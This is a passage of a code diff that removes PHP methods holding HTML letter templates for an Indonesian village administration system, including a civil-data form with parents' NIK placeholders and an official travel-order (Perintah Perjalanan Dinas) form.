-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">15.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Akta Perceraian</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[AkTa_perceraian]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">16.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Tanggal Perceraian</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[TaNggalperceraian]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">17.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Status Hubungan Dalam Keluarga</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[HuBungan_kk]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">18.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Kelainan Fisik / Mental</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[CaCat]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">19.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Pendidikan Akhir</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[PeNdidikan_kk]</td>
-            </tr>
-            <tr style=\"height: 26.1875px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 26.1875px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 26.1875px;\">20.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 26.1875px;\">Pekerjaan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 26.1875px;\">:</td>
-            <td style=\"width: 60.0206%; height: 26.1875px; text-align: justify;\">[PeKerjaan]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\"><strong>III. DATA ORANG TUA<br /></strong></p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 83px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 25px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 25px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; height: 25px; text-align: left;\">1.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 25px;\">Nama Ibu</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 25px;\">:</td>
-            <td style=\"width: 60.0211%; height: 25px; text-align: justify;\">[Nama_ibu]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; text-align: left; height: 18px;\">2.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 18px;\">NIK Ibu</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 60.0211%; text-align: justify; height: 18px;\">[nik_ibu]</td>
-            </tr>
-            <tr style=\"height: 22px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 22px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; text-align: left; height: 22px;\">3.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 22px;\">Nama Ayah</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 22px;\">:</td>
-            <td style=\"width: 60.0211%; text-align: justify; height: 22px;\">[Nama_ayah]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; text-align: left; height: 18px;\">4.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 18px;\">NIK Ayah</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 60.0211%; text-align: justify; height: 18px;\">[nik_ayah]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\">\u{a0}</p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 199.906px;\" border=\"0\">
-            <tbody>
-            <tr style=\"height: 28.625px;\">
-            <td style=\"width: 35.0462%; text-align: center; height: 28.625px;\">\u{a0}</td>
-            <td style=\"width: 30.0103%; height: 28.625px;\">\u{a0}</td>
-            <td style=\"width: 35.0462%; text-align: center; height: 28.625px;\">[NaMa_desa], [TgL_surat]</td>
-            </tr>
-            <tr style=\"height: 22.625px;\">
-            <td style=\"width: 35.0462%; text-align: center; height: 22.625px;\">\u{a0}</td>
-            <td style=\"width: 30.0103%; height: 22.625px;\">\u{a0}</td>
-            <td style=\"width: 35.0462%; text-align: center; height: 22.625px;\">[Atas_namA]</td>
-            </tr>
-            <tr style=\"height: 96.3438px;\">
-            <td style=\"width: 35.0462%; text-align: center; height: 96.3438px;\">\u{a0}</td>
-            <td style=\"width: 30.0103%; height: 96.3438px;\"><br /><br /><br /><br /></td>
-            <td style=\"width: 35.0462%; height: 96.3438px;\">\u{a0}</td>
-            </tr>
-            <tr style=\"height: 21.625px;\">
-            <td style=\"width: 35.0462%; text-align: center; height: 21.625px;\">\u{a0}</td>
-            <td style=\"width: 30.0103%; height: 21.625px;\">\u{a0}</td>
-            <td style=\"width: 35.0462%; text-align: center; height: 21.625px;\">[Nama_pamonG]</td>
-            </tr>
-            <tr style=\"height: 30.6875px;\">
-            <td style=\"width: 35.0462%; height: 30.6875px;\">\u{a0}</td>
-            <td style=\"width: 30.0103%; height: 30.6875px;\">\u{a0}</td>
-            <td style=\"width: 35.0462%; text-align: center; height: 30.6875px;\">[SEbutan_nip_desa] : [nip_pamong]</td>
-            </tr>
-            </tbody>
-            </table>
-            <div style=\"text-align: center;\">\u{a0}</div>",
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratPerintahPerjalananDinas($hasil, $id)
-    {
-        $nama_surat = 'Perintah Perjalanan Dinas';
-        $template   = <<<HTML
-                    <table style="border-collapse: collapse; width: 42.264%; height: 58px;" border="0" align="right">
-                <tbody>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 25.4998%; height: 18.75px;">Lembar Ke</td>
-                        <td style="width: 74.5527%; height: 18.75px;">:\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 25.4998%; height: 18.75px;">Kode Ke</td>
-                        <td style="width: 74.5527%; height: 18.75px;">:\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 25.4998%; height: 18.75px;">Nomor</td>
-                        <td style="width: 74.5527%; height: 18.75px;">: [Format_nomor_suraT]</td>
-                    </tr>
-                </tbody>
-            </table>
-            <p>\u{a0}</p>
-            <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-            <p>\u{a0}</p>
-            <table style="border-collapse: collapse; width: 94.9743%; height: 803.203px; margin-left: auto; margin-right: auto;"
-                border="1">
-                <tbody>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">1. Pengguna Anggaran</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Sebutan_kepala_desA] [Nama_desA]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">2. Nama pegawai yang diperintah</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;"><strong>[NamA]</strong></td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">3. a. Pangkat dan Golongan</td>
-                        <td style="width: 2.01724%; height: 18.75px;">a</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_pangkat_dan_golongaN]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">\u{a0} \u{a0} b. Jabatan/Instansi</td>
-                        <td style="width: 2.01724%; height: 18.75px;">b</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_jabataninstansI]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">\u{a0} \u{a0} c. Tingkat Biaya Perjalanan</td>
-                        <td style="width: 2.01724%; height: 18.75px;">c</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_tingkat_biaya_perjalanaN]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">4. Maksud Perjalanan Dinas</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;"><strong>[Form_maksud_perjalanan_dinaS]</strong></td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">5. a. Tempat Berangkat</td>
-                        <td style="width: 2.01724%; height: 18.75px;">a.</td>
-                        <td style="width: 64.9718%; height: 18.75px;">Kantor [Sebutan_desA] [Nama_desA]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">\u{a0} \u{a0} b. Tempat Tujuan</td>
-                        <td style="width: 2.01724%; height: 18.75px;">b.</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_tempat_tujuaN]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">6. a. Tanggal Berangkat</td>
-                        <td style="width: 2.01724%; height: 18.75px;">a.</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_tanggal_berangkaT]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">b. Tanggal Kembali</td>
-                        <td style="width: 2.01724%; height: 18.75px;">b.</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_tanggal_kembalI]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">7. Alat angkut yang dipergunakan</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_alat_angkut_yang_digunakaN]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">8. Pengikut Nama</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 35.0495%;" colspan="3">
-                            <table width="100%">
-                                <tbody>
-                                    <tr>
-                                        <td width="50%">
-                                            <table>
-                                                <tbody>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 8.4878%; height: 18.75px;" width="23">1.</td>
-                                                        <td style="width: 91.5091%; height: 18.75px;" width="283">
-                                                            [Form_nama_pengikut_I]</td>
-                                                    </tr>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 8.4878%; height: 18.75px;" width="23">2.</td>
-                                                        <td style="width: 91.5091%; height: 18.75px;" width="283">
-                                                            [Form_nama_pengikut_iI]</td>
-                                                    </tr>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 8.4878%; height: 18.75px;" width="23">3.</td>
-                                                        <td style="width: 91.5091%; height: 18.75px;" width="283">
-                                                            [Form_nama_pengikut_iiI]</td>
-                                                    </tr>
-                                                </tbody>
-                                            </table>
-                                        </td>
-                                        <td>
-                                            <table>
-                                                <tbody>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 8.19431%;" width="25">4.</td>
-                                                        <td style="width: 92.0655%;" width="262">[Form_nama_pengikut_iV]</td>
-                                                    </tr>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 8.19431%;" width="25">5.</td>
-                                                        <td style="width: 92.0655%;" width="262">[Form_nama_pengikut_V]</td>
-                                                    </tr>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 8.19431%;" width="25">6.</td>
-                                                        <td style="width: 92.0655%;" width="262">[Form_nama_pengikut_vI]</td>
-                                                    </tr>
-                                                </tbody>
-                                            </table>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">9. Pembebanan Anggaran</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">a. Instansi</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">a. Kantor [Sebutan_desA] [Nama_desA]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">b. Mata Anggaran</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">b. APBKam\u{a0}\u{a0}Tahun [TahuN]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 33.0323%; height: 18.75px;">10. Keterangan lain-lain</td>
-                        <td style="width: 2.01724%; height: 18.75px;">:</td>
-                        <td style="width: 64.9718%; height: 18.75px;">[Form_keterangan_laiN]</td>
-                    </tr>
-                </tbody>
-            </table>
-            <h4 style="margin: 0; text-align: center;">\u{a0}</h4>
-            <table style="border-collapse: collapse; width: 97.4463%; height: 192px;" border="0">
-                <tbody>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 67.8329%; text-align: left;">\u{a0}</td>
-                        <td style="width: 32.1882%; text-align: left; height: 18.75px;">Ditetapkan di : [NaMa_desa]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 67.8329%; text-align: left;">\u{a0}</td>
-                        <td style="width: 32.1882%; text-align: left;">Pada Tanggal :\u{a0} [TgL_surat]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 67.8329%; text-align: left;">\u{a0}</td>
-                        <td style="width: 32.1882%; text-align: left; height: 18.75px;">[Sebutan_kepala_desA] [Nama_desA]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 67.8329%; text-align: center;">\u{a0}</td>
-                        <td style="width: 32.1882%; text-align: center; height: 18.75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 75px;">
-                        <td style="width: 67.8329%;">\u{a0}</td>
-                        <td style="width: 32.1882%; height: 75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 67.8329%; text-align: center;">\u{a0}</td>
-                        <td style="width: 32.1882%; text-align: center; height: 18.75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 67.8329%; text-align: left;"><strong>\u{a0}</strong></td>
-                        <td style="width: 32.1882%; text-align: left; height: 18.75px;"><strong>[Nama_pamonG]</strong></td>
-                    </tr>
-                </tbody>
-            </table>
-            <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">\u{a0}</span></h4>
-            <table style="border-collapse: collapse; width: 95%; margin-left: auto; margin-right: auto; height: 977.29px;"
-                border="1">
-                <tbody>
-                    <tr style="height: 160.445px;">
-                        <td style="height: 160.445px;" colspan="2">
-                            <table style="width: 100.29%;" align="left">
-                                <tbody>
-                                    <tr>
-                                        <td style="width: 64.8654%;">
-                                            <table style="border-collapse: collapse; width: 48.2556%;" width="100%">
-                                                <tbody>
-                                                    <tr style="height: 18.5px;">
-                                                        <td style="width: 29.6649%; text-align: right; height: 18.5px;" width="105">
-                                                            I. Berangkat dari</td>
-                                                        <td style="text-align: left; width: 70.2443%; height: 18.5px;" width="304">:
-                                                            Kantor [Sebutan_desA] [Nama_desA]</td>
-                                                    </tr>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 29.6649%; height: 18.75px; text-align: right;"
-                                                            width="105">Ke</td>
-                                                        <td style="text-align: left; width: 70.2443%; height: 18.75px;" width="304">
-                                                            : [Form_tempat_tujuaN]</td>
-                                                    </tr>
-                                                    <tr style="height: 18.75px;">
-                                                        <td style="width: 29.6649%; height: 18.75px; text-align: right;"
-                                                            width="105">Pada Tanggal</td>
-                                                        <td style="text-align: left; width: 70.2443%; height: 18.75px;" width="304">
-                                                            : [Form_tanggal_berangkaT]</td>
-                                                    </tr>
-                                                </tbody>
-                                            </table>
-                                        </td>
-                                        <td style="width: 35.2169%;">
-                                            <div style="width: 200px;">\u{a0}</div>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td style="width: 100.082%;" colspan="2">
-                                            <table style="border-collapse: collapse; height: 68.2422px;" width="100%"
-                                                align="center">
-                                                <tbody>
-                                                    <tr style="height: 68.2422px;">
-                                                        <td style="text-align: center; height: 68.2422px;">[Sebutan_kepala_desA]
-                                                            [Nama_desA]
-                                                            <p><br><br><strong>( [Nama_pamonG]</strong><strong>\u{a0})</strong></p>
-                                                        </td>
-                                                    </tr>
-                                                </tbody>
-                                            </table>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                    </tr>
-                    <tr style="height: 177.188px;">
-                        <td style="width: 47.3086%; height: 185.172px;" width="315">
-                            <table style="border-collapse: collapse; width: 100%; height: 177.188px;">
-                                <tbody>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">II.</td>
-                                        <td style="width: 31.335%; height: 18.75px;">Tiba di\u{a0}</td>
-                                        <td style="width: 63.765%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 31.335%; height: 18.75px;">Pada Tanggal</td>
-                                        <td style="width: 63.765%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 31.335%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 63.765%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 31.335%; height: 18.75px;">Kepala</td>
-                                        <td style="width: 63.765%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 31.335%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 63.765%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 31.335%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 63.765%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="height: 18.75px; width: 95.1%;" colspan="2">( ...................................
-                                            )</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                        <td style="width: 52.6865%; height: 177.188px;" width="351">
-                            <table style="border-collapse: collapse; width: 100.85%; height: 177.188px;" border="0">
-                                <tbody>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9707%; height: 18.75px;">Berangkat dari\u{a0}</td>
-                                        <td style="width: 66.5695%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9707%; height: 18.75px;">Ke</td>
-                                        <td style="width: 66.5695%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9707%; height: 18.75px;">Pada Tanggal</td>
-                                        <td style="width: 66.5695%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9707%; height: 18.75px;">Kepala</td>
-                                        <td style="width: 66.5695%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9707%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 66.5695%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9707%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 66.5695%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="height: 18.75px; width: 95.5402%;" colspan="2">(
-                                            ................................... )</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                    </tr>
-                    <tr style="height: 177.188px;">
-                        <td style="width: 47.3086%; height: 177.188px;" width="315">
-                            <table style="border-collapse: collapse; width: 100%; height: 177.188px;">
-                                <tbody>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">III.</td>
-                                        <td style="width: 30.7993%; height: 18.75px;">Tiba di\u{a0}</td>
-                                        <td style="width: 64.3008%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.7993%; height: 18.75px;">Pada Tanggal</td>
-                                        <td style="width: 64.3008%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.7993%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 64.3008%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.7993%; height: 18.75px;">Kepala</td>
-                                        <td style="width: 64.3008%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.7993%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 64.3008%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.7993%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 64.3008%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="height: 18.75px; width: 95.1%;" colspan="2">( ...................................
-                                            )</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                        <td style="width: 52.6865%; height: 177.188px;" width="351">
-                            <table style="border-collapse: collapse; width: 100.85%; height: 177.188px;" border="0">
-                                <tbody>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Berangkat dari\u{a0}</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Ke</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Pada Tanggal</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Kepala</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%;">\u{a0}</td>
-                                        <td style="height: 18.75px; width: 95.5402%;" colspan="2">(
-                                            ................................... )</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                    </tr>
-                    <tr style="height: 177.188px;">
-                        <td style="width: 47.3086%; height: 177.188px;" width="315">
-                            <table style="border-collapse: collapse; width: 100%; height: 177.188px;">
-                                <tbody>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">IV.</td>
-                                        <td style="width: 30.2693%; height: 18.75px;">Tiba di\u{a0}</td>
-                                        <td style="width: 64.6516%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.2693%; height: 18.75px;">Pada Tanggal</td>
-                                        <td style="width: 64.6516%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.2693%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 64.6516%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.2693%; height: 18.75px;">Kepala</td>
-                                        <td style="width: 64.6516%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.2693%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 64.6516%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 30.2693%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 64.6516%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 5.01469%; height: 18.75px;">\u{a0}</td>
-                                        <td style="height: 18.75px; width: 94.9209%;" colspan="2">(
-                                            ................................... )</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                        <td style="width: 52.6865%; height: 177.188px;" width="351">
-                            <table style="border-collapse: collapse; width: 100.85%; height: 177.188px;" border="0">
-                                <tbody>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Berangkat dari\u{a0}</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Ke</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Pada Tanggal</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">Kepala</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">:</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">\u{a0}</td>
